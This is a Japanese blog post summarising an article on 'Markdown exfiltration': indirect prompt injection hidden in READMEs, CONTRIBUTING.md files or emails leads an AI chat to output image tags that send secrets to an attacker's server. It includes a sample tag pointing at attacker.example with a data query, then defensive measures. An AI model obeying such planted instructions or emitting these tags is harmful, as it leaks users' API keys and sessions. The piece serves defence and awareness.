---
layout: post
title: "The Markdown Exfiltrator: Turning AI Rendering into a Data-Stealing Tool - Markdown流出攻撃：AIのレンダリングをデータ窃取ツールに変える"
date: 2026-01-23T14:54:54.126Z
categories: [tech, world-news]
tags: [tech-news, japan]
source_url: "https://instatunnel.my/blog/the-markdown-exfiltrator-turning-ai-rendering-into-a-data-stealing-tool"
source_title: "Markdown Exfiltration: How AI Rendering Leaks Private Data | InstaTunnel Blog"
source_id: 419662242
excerpt: "AIのMarkdown画像がゼロクリックでAPIキー等を抜き取る新攻撃と具体的対策を解説"
image: "https://i.ibb.co/Tq7hbz6d/The-Markdown-Exfiltrator-Turning-AI-Rendering-into-a-Data-Stealing-Tool.png"
---

# The Markdown Exfiltrator: Turning AI Rendering into a Data-Stealing Tool - Markdown流出攻撃：AIのレンダリングをデータ窃取ツールに変える
AIの「親切」が致命傷に—見るだけでAPIキーやセッションが盗まれる新手法

## 要約
AIチャットのMarkdown画像タグ（![]()）を悪用し、レンダリング時にブラウザが攻撃者のサーバへ機密情報を送信してしまう「Markdown Exfiltrator」というゼロクリックのデータ流出手法を解説します。

## この記事を読むべき理由
日本の開発現場でも、LLMをコードレビューや要約に組み込む流れは急速に進んでおり、サプライチェーンや社内ドキュメントを起点とする「間接プロンプト注入（IPI）」は現実的な脅威です。対策の優先順位を知るために必読です。

## 詳細解説
- 攻撃の核：AIの出力に埋め込まれたMarkdown画像タグ（例: ![](https://attacker.example/pixel.png?data=SECRET)）。ブラウザは画像取得のためにGETリクエストを送り、URLのクエリに機密を載せれば即座に漏洩する。ユーザ操作は不要（ゼロクリック）。
- 間接プロンプト注入（IPI）：攻撃者はREADME、共同ドキュメント、メール、字幕などAIが参照する外部データに「命令」を隠し、AIがそれを“要約”や“参考”として取り込み実行してしまう。
- 配置例：オープンソースのCONTRIBUTING.mdやメール本文に隠し指示を置き、AIがリポジトリや受信箱を解析する流れで誘発。
- なぜ従来の防御が効かないか：CSPやサーバ側フィルタは一部を防げるが、ブラウザが直接外部へアクセスするクライアントサイド漏洩は迂回されやすい。攻撃者は信頼ドメインやオープンリダイレクトを悪用する。
- 実例・研究動向：HashJack、EchoLeak 等の報告やOWASP LLM Top 10での上位ランク入りが示す通り、実運用で既に検証済みのリスク。

## 実践ポイント
- AIサービス提供者向け：画像はブラウザに直渡しせずプロキシ経由でサニタイズ／キャッシュする。出力チェッカー（別の低特権モデル）で高エントロピーなクエリ付きURLを検出・削除。
- 開発者向け：外部データはすべて不信扱いでサニタイズ。AIの応答はサンドボックスやiframeで隔離し、外部送信アクションは必ず人の確認を挟む。
- エンドユーザ向け：ブラウザ拡張の自動要約を不用意に使わない。APIキーは短命・限定権限にし、異常なアウトバウンド接続を監視する（ローカルプロキシやネットワークログ）。
- 組織対策：プロンプトレッドチーミングで社内AIの弱点検査を定期実施し、CSPと画像許可リストを最小化する。

短い結論：AIの「出力」は表示形式（Markdown等）まで含めて脅威面を持つ。開発者・運用者は表示パイプラインを再設計し、ユーザは自動化の“親切”に注意を。
